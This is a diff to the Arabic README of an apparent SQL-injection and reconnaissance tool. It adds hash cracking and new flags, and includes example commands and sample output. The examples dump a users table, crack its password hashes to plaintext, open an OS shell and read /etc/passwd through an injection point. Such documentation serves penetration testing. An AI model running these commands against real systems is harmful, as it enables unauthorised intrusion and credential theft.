@@ -33,7 +33,9 @@ go install github.com/0xseif-code/vexor/cmd/vexor@latest
 | 🔍 **Subdomain** | استطلاع النطاقات الفرعية | Worker-Pool لنشاط DNS + crt.sh السلبي |
 | 📁 **Directory** | اكتشاف المسارات والملفات | فحص تعاودي + تصفية ذكية عبر Baseline |
 | 🎯 **Fuzzing** | تعدين الباراميترات | علامات `FUZZ` متعددة المواضع + تحليل الاستجابة |
-| 💉 **SQLi** | استغلال الثغرات | 7 تقنيات كشف أساسية + Tamper لتجاوز الـ WAF |
+| 💉 **SQLi** | استغلال الثغرات | 7 تقنيات كشف + تجاوز الـ WAF + سرد/تفريغ آلي + كسر الهاشات |
+| 🔑 **Hash Crack** | استعادة كلمات المرور دون اتصال | محدّد نوع تلقائي + عامل عامل داخل Dictionary Worker-Pool |
+| 💬 **Interactive UX** | تشغيل موجّه | محرّك أسئلة مع واعي للـ batch + تقدّم حي + ملخّص قياسات |
 | 📚 **Wordlists** | إدارة قوائم الكلمات | تنزيل تلقائي من SecLists حسب الطلب (`~/.vexor/`) |
 
 ---
@@ -92,8 +94,9 @@ vexor subdomain -d example.com
 
 | العلم | الاختصار | النوع | الوصف | الافتراضي |
 |---|---|---|---|---|
-| `--timeout` | | int | مهلة الطلب العالمية (ثوانٍ) | `10` |
-| `--threads` | | int | عدد سلاسل التزامن العالمية | `50` |
+| `--timeout` | | int | مهلة الطلب العالمية (ثوانٍ) | `8` |
+| `--threads` | | int | عدد سلاسل التزامن العالمية | `10` |
+| `--batch` | | bool | عدم السؤال أبدًا؛ استخدام الإجابات الافتراضية | `false` |
 | `--proxy` | | string | بروكسي HTTP/SOCKS5، `http://127.0.0.1:8080` | |
 | `--headers` | | stringarray | هيدر مخصّص، قابل للتكرار | |
 | `--format` | | string | المخرج: `plain`, `json`, `csv` | `plain` |
@@ -213,16 +216,25 @@ $ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-st
 ### `sqli` — كشف واستغلال حقن SQL
 
 سبع تقنيات كشف عبر كل الباراميترات — boolean, error, time, union, stacked,
-inline, OOB — ثم استغلال كامل على أول نقطة مؤكَّدة.
+inline, OOB — ثم استغلال كامل على أول نقطة مؤكَّدة. الاستغلال شبه آلي:
+`-D ... -T ... --dump` يتنقّل بذاته بين قواعد البيانات ← الجداول ← الأعمدة،
+ويمكن كسر هاشات كلمات المرور المكتشفة دون اتصال عبر قاموس مدمج.
 
 | العلم | الاختصار | النوع | الوصف | الافتراضي |
 |---|---|---|---|---|
 | `--url` | `-u` | string | الهدف، مثل `https://example.com/page?id=1` | |
 | `--request` | `-r` | string | ملف طلب خام بصيغة Burp | |
 | `--param` | `-p` | string | اختبار باراميتر واحد فقط | |
+| `--technique` | `-t` | string | أكواد التقنيات: `B`,`E`,`U`,`S`,`T`,`I`,`O` (قابلة للدمج مثل `BEU`) أو اسم تقنية | `all` |
 | `--dbms` | | string | فرض قاعدة بيانات: `mysql`, `postgres`, `mssql`, `oracle`, `sqlite` | `auto` |
 | `--level` | | int | شدة الاختبار (1-5) | `1` |
 | `--risk` | | int | خطورة الحمولات (1-3) | `1` |
+| `--threads` | | int | سلاسل التزامن | `10` |
+| `--fast` | | bool | فحص سريع: مستوى/خطورة 1 + error وunion فقط | `false` |
+| `--timeout` | | int | مهلة الطلب (ثوانٍ) | `8` |
+| `--delay` | | int | نوم بين الطلبات (ملي ثانية) | `0` |
+| `--retries` | | int | إعادة المحاولة للطلبات الفاشلة | `1` |
+| `--batch` | | bool | تشغيل غير تفاعلي؛ اختيار الافتراضي لكل سؤال | `false` |
 | `--tamper` | | stringslice | سكربتات Tamper، مثل `space2comment,randomcase` | |
 | `--auto-tamper` | | bool | بصمة الـ WAF + سلسلة Tamper مقترحة | `false` |
 | `--oob-domain` | | string | نطاق لقنوات OOB (DNS/HTTP) | |
@@ -233,6 +245,8 @@ inline, OOB — ثم استغلال كامل على أول نقطة مؤكَّد
 | `--database` | `-D` | string | اسم القاعدة لـ `--tables/--columns/--dump` | |
 | `--table` | `-T` | string | اسم الجدول لـ `--columns/--dump` | |
 | `--column` | `-C` | stringslice | أعمدة محدّدة للتفريغ، قابلة للتكرار | |
+| `--crack` | | bool | كسر الهاشات دون سؤال إضافي | `false` |
+| `--no-crack` | | bool | عدم كسر الهاشات نهائيًا | `false` |
 | `--os-shell` | | bool | قشرة نظام تفاعلية عبر نقطة الحقن | `false` |
 | `--read-file` | | string | قراءة ملف من خادم قاعدة البيانات | |
 | `--write-file` | | string | كتابة ملف محلي إلى الخادم | |
@@ -242,35 +256,53 @@ inline, OOB — ثم استغلال كامل على أول نقطة مؤكَّد
 # فحص حقن SQL أساسي
 vexor sqli -u "http://target.com/page.php?id=1"
 
-# تجاوز WAF تلقائي + استخراج البيانات
+# تقنيتا error + union فقط على باراميتر واحد
+vexor sqli -u "http://target.com/page.php?id=1" -p id -t "BEU"
+
+# فحص آلي + استخراج كامل (قاعدة -> جدول -> أعمدة آليًا)
 vexor sqli -u "http://target.com/page.php?id=1" --auto-tamper --dbs
 
-# تفريغ جدول
+# تفريغ جدول (يُحلّ اسم الجدول تلقائيًا إذا كان قريبًا)
 vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C id,username,password
+
+# كسر الهاشات بعد التفريغ (أو --batch لرفض الأسئلة)
+vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users --crack
+vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C password --batch
 
 # استحواذ كامل
 vexor sqli -u "http://target.com/page.php?id=1" --os-shell
 vexor sqli -u "http://target.com/page.php?id=1" --read-file /etc/passwd
 ```
 
+يُجاب عن الأسئلة التفاعلية (تصفية قاعدة البيانات، Tamper للـ WAF، تركيز
+الباراميتر، حدّ التفريغ الكبير، كسر الهاشات) تلقائيًا بقيم افتراضية معقولة
+عند استخدام `--batch` أو عندما لا يكون stdin طرفية.
+
 ```text
 $ vexor sqli -u "https://example.com/page?id=1" --level 2
-[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=50)
+[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=10)
 URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
 URL query parameter/GET/id technique=error   dbms=mysql confidence=88
 POST form parameter/POST/user technique=time      dbms=mysql confidence=76
 ...
 [+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
 [i] fingerprinted DBMS: mysql
+[+] done | requests=412 | elapsed=125.3s | rate=3.3 req/s | phase(detect=125.3s)
 
-$ vexor sqli -u "https://example.com/page?id=1" --dbs
+$ vexor sqli -u "https://example.com/page?id=1" --dump -D shop -T users --crack
 ...
 [i] first confirmed injection point: GET/id (boolean)
-information_schema
-shop
-mysql
+id      username        password
+1       admin           *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+2       bob             *A4B6157319038726FF3A9A4DFFED4DEB
 ...
-[+] done in 3m41s
+[+] dumped 2 rows from shop.users (3 columns)
+[*] cracking 2 hash(es) via default 10k passwords
+[*] Cracking hashes: 1/2 solved (50.0%) | Speed: 312 480 H/s
+[*] Cracking finished: 2/2 hashes solved (100.0%) in 412ms (4 940 attempts)
+shop.users: admin | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 (admin123)
+shop.users: bob | *A4B6157319038726FF3A9A4DFFED4DEB (bob)
+[+] done | requests=88 | elapsed=9.7s | rate=9.1 req/s | phase(detect=5.2s enum=1.6s dump=2.9s)
 ```
 
 ### `update-wordlists` — إدارة الذاكرة المحلية
@@ -304,6 +336,9 @@ $ vexor update-wordlists
   `passwords`, `passwords-large`, `endpoints`.
 - **قوائم مخصّصة (`-w /path/to/file.txt`):** أي ملف محلي، كلمة في كل سطر —
   يلغي قالب الحجم.
+- **كسر الهاشات** يستخدم قائمة `passwords` المخزّنة افتراضيًا، أو ملفًا
+  مخصّصًا؛ يحدد المكسّر نوع الهاش (MD5, SHA-1, bcrypt, ...) ثم يبثّ القاموس
+  عبر حوض عاملين، لذلك لا تُحمَّل القوائم الكبيرة في الذاكرة كاملة.
 
 صيغ المخرجات حسب الفحص:
 
